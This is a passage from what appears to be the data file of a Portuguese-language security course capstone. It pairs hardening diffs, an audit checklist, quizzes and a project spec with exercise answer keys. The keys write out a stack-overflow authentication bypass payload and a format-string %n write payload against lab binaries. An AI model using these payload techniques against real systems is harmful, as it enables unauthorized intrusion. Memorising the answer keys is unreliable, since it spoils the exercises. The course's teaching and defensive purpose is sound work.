+    printf("nivel de seguranca: %s\\n", nivel ? "ok" : "baixo");
+    /* nada de "escreva num global e vire admin" */
@@ campo minimo da entrada:
-    char evento[512];
+    char evento[256];   /* menor; e mesmo assim so com %s */
@@ build:
+    gcc -O2 -Wall -Wextra -Wformat-security -Werror=format-security \\
+        -fstack-protector-all -pie -z relro -z now ctf2.c -o ctf2_hard`,
      },
      {
        titulo: 'Como se defender (checklist final da auditoria)',
        lista: [
          'Leia o código procurando ENTRADA, CÓPIA, FORMAT e ESTADO — não linha por linha: primeiro o mapa dos pontos que recebem dados externos.',
          'Classe as fraquezas com CWE (é o idioma que engenheiros, GTDs e bots de segurança entendem) e grave linha + impacto + explotabilidade.',
          'Reproduza SEMPRE: um bug que não se reproduz em teste não pode ser classificado como "corrigido". Sanitizers e valgrind são o instrumento (rodando no CI).',
          'Aplique o combo de mitigação em qualquer build (canário, NX, PIE, FULL RELRO, FORTIFY, format-security) e confirme com checksec.',
          'Reduza superfície: menos shell, menos sistemas(), menos globais, menos campos de entrada.',
          'Documente: writeup + diff em git review, para que o (próximo) humano entenda o "porquê" além do "o quê".',
          'Se você encontrar um bug em código alheio/produção: pare, reporte ao responsável com proposta de correção, não prove nada contra outros sistemas.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 3,
        enunciado:
          'Sem olhar o gabarito: reproduza o bypass de autenticação do ctf1.c (32-bit) gravando o byte 1 no local "permitido", e depois o ret2win saltando para painel_admin. Anote endereços e offsets SUAS.',
        dica: 'Primeiro meça onde fica permitido em relação a senha (gdb: p &senha, p &permitido). O ret2win: offset = espaco_de_senha + 4 (saved ebp).',
        solucao: `$ gdb ./ctf1
(gdb) break 18
(gdb) run
(gdb) p &senha
$1 = (char (*)[32]) 0xbfffefac
(gdb) p &permitido
$2 = (int *) 0xbffff01c   # permitido logo apos senha
(gdb) quit
$ python3 -c "print('A'*32 + '\\x01')" | ./ctf1
senha: acesso concedido`,
        solucao_obs: 'Layout real da frame confirmado no gdb — e por isso "33 bytes" muda a leitura do programa: perceba que strcmp compara a FONTE estourada...',
      },
      {
        nivel: 3,
        enunciado:
          'No ctf2.c, descubra o endereço da global <code>nivel</code> com <code>nm</code>, monte o payload %n que grava um valor pequeno (ex.: %5$n ou %6$n — encontre o índice do seu buffer) e eleve o nível. Depois repita com um offset errado e explique por que o programa sai com SIGSEGV.',
        dica: 'Como em 4.07, o índice do seu buffer no 32-bit se descobre com uma varredura de %N$p.',
        solucao: `$ nm ctf2 | grep ' nivel'
0804a024 B nivel
$ python3 -c 'import struct,sys
sys.stdout.buffer.write(struct.pack("<I",0x0804a024)+b"%6\$n")' | ./ctf2 || true
# se nao alterar, redescubra o indice do buffer (4.07, exercicio 1)
# e troque %6$n pelo indice certo. Ao acertar -->
# nivel de seguranca: ELEVADO`,
        solucao_obs: 'Obs.: em bash POSIX o escape \\$ dentro de aspas duplas é literal; no exercício use aspas simples (como no gabarito) e n-uplo ação de teste.',
      },
      {
        nivel: 3,
        enunciado:
          'Complete a auditoria defensiva: além das fraquezas do gabarito, encontre pelo menos 1 achado NÃO listado em cada binário (ex.: em ctf1, o system() num app; em ctf2, ausência de sprint/relatro, compilação sem proteções). Monte a tabela com CWE//linha/impacto/explotabilidade/correção.',
        dica: 'Pense em: (1) menor privilégio, (2) estado global compartilhado, (3) falta de logging confiável, (4) retorno não verificado.',
        solucao: `/* exemplos de achados extras plausiveis */

ctf1:
- CWE-676 (Funcao perigosa): system() chamado com /bin/sh
  dentro do codigo; impacto = RCE mesmo SEM bug de memoria;
  explotabilidade: media (depende de alcançar painel_admin);
  correcao: remover system/exec de um terminal de login.
- CWE-306 (Controle de acesso ausente): painel_admin acessivel
  por ret (mesmo corrigido, o ret2func e um vetor classico).

ctf2:
- CWE-74 (Injecao de conteudo) generalizado: a linha eh "logada"
  com o conteudo bruto; store com escaping/limites.
- CWE-693 (Mecanismo de protecao ausente): build sem canario.`,
        solucao_obs: 'A graça da auditoria é achar o que o gabarito não listou — não precisa ser elegante, precisa estar correto.',
      },
    ],
    quiz: [
      {
        pergunta: 'Quais são as duas notas de entrega do capstone?',
        opcoes: [
          'Dois exploits resolvidos em CTF ético com writeup + auditoria de ctf1.c e ctf2.c com CWE/linha/impacto/correção',
          'Um vídeo e um slide',
          'Um relatório de phishing',
          'Um proxy e um script de rede',
        ],
        correta: 0,
        explicacao: 'Braço ofensivo (exploit + writeup) e braço defensivo (auditoria com CWE e correções) no mesmo diretório.',
      },
      {
        pergunta: 'No ctf1.c, o bypass "gravou byte 1 no permitido" corresponde a qual fraqueza?',
        opcoes: [
          'CWE-287 (autenticação imprópria), consequência do CWE-121/gets',
          'CWE-476 (NULL pointer dereference)',
          'CWE-416 (use-after-free)',
          'CWE-134 (format string)',
        ],
        correta: 0,
        explicacao: 'O overflow do buffer corrompeu a variável de decisão de autenticação — clássica escalada de escrita em frame.',
      },
      {
        pergunta: 'No ctf2.c, por que o endereço de <code>nivel</code> é previsível para o payload %n?',
        opcoes: [
          'Porque o binário é -no-pie e a global tem endereço fixo na sessão (esteja ASLR ligado ou não para o binário)',
          'Porque o nível é sempre igual a zero',
          'Porque é uma variável local',
          'Porque o compilador ordena as globals por ordem alfabética',
        ],
        correta: 0,
        explicacao: 'Globais de binário não-PIE vivem em endereço fixo; com -no-pie o nm mostra o alvo exato.',
      },
      {
        pergunta: 'O que NÃO faz parte do método de auditoria aplicado no capstone?',
        opcoes: [
          'Rodar o exploit contra a plataforma de produção da empresa',
          'Inventariar pontos de entrada de dados externos',
          'Reproduzir o bug com sanitizers/valgrind antes de classificar',
          'Registrar CWE, linha, impacto, explotabilidade e correção',
        ],
        correta: 0,
        explicacao: 'Auditoria ética reproduz em sandbox/lab próprio; atacar produção sem autorização é ilegal — jamais faz parte do método.',
      },
    ],
    projeto: {
      titulo: 'Capstone completo: 2 writeups + 1 relatório de auditoria',
      descricao:
        'Consolide em <code>~/labs/4.10</code>: (1) <code>writeup_challA.md</code> e <code>writeup_challB.md</code> dos dois binários de CTF que você resolveu (checksec, análise, exploit, prova, defesa); (2) <code>auditoria_ctf1.md</code> e <code>auditoria_ctf2.md</code> com a tabela de achados (CWE, linha, impacto, explotabilidade, correção) + diffs aplicados; (3) <code>versao_corrigida_ctf1.c</code> e <code>ctf2.c</code> compilando com o combo defensivo e checksec mostrando as proteções ligadas; (4) um README.md de epílogo com 3 lições pessoais da trilha. Lembre: nada de explorer nada fora do lab.',
      criterios: [
        '2 writeups completos com exploit reproduzível (ou flag capturada nas plataformas).',
        '2 relatórios de auditoria com no mínimo 3 achados cada (totais) e tabela CWE/linha/impacto/explotabilidade/correção.',
        'Versões corrigidas compilando com flags defensivas e checksec com NX/PIE/canário/RELRO adequados.',
        'README final com as 3 lições pessoais.',
        'Nenhuma evidência de atividade fora do lab (endereços = loopback/plataformas de CTF).',
      ],
    },
  },
];